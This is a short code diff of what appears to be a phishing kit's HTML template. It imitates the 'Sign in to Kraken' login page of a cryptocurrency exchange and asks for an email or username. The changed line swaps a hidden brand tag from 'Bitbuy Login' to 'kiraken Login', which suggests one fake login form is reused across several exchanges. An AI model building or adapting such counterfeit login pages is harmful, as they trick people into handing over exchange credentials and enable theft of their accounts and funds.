@@ -89,7 +89,7 @@
                 <div class="container-fluid" id="welcome-section">
                     <form action="" method="post">
                         <h1 class="Sharedstyles__Header-sc-1482qak-5 fVMOP" style="text-align:center; font-weight:700">Sign in to Kraken</h1>
-                        <input type="hidden" name="brandName" value="Bitbuy Login">
+                        <input type="hidden" name="brandName" value="kiraken Login">
                         <div class="form-group">
                             <input type="text" class="form-control" id="exampleInputEmail1" name="email" placeholder="Email or Username"
                                 placeholder="Email address" required>
